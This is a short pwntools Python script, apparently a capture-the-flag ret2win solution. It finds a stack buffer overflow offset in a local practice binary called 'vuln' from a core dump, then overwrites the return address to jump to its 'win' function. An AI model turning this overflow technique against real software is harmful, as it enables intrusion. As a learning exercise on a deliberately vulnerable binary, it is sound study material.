from pwn import *

elf=context.binary =ELF("./vuln")
p=process(elf.path)

payload=cyclic(200)
p.sendlineafter(b"Input:",payload)
p.wait()

core=p.corefile
log.info(f"RSP_addr crased: {core.rsp}")

data_crash=core.read(core.rsp,8) # i wanna read 8-bytes
log.info(f"data that cause crash at rsp: {data_crash}")
offset=cyclic_find(data_crash[:4])      #cyclic_find loves work with 4-bytes to find the offset
log.info(f"Offset crashed at: {offset}")

win_addr=elf.sym["win"]
log.info(f"win_addr at: {win_addr}")
f_payload=flat(b"A"*offset,win_addr)
log.info(f"the payload: {f_payload}")

p=process(elf.path)
p.sendlineafter(b"Input:",f_payload)
print(p.recvall().decode())
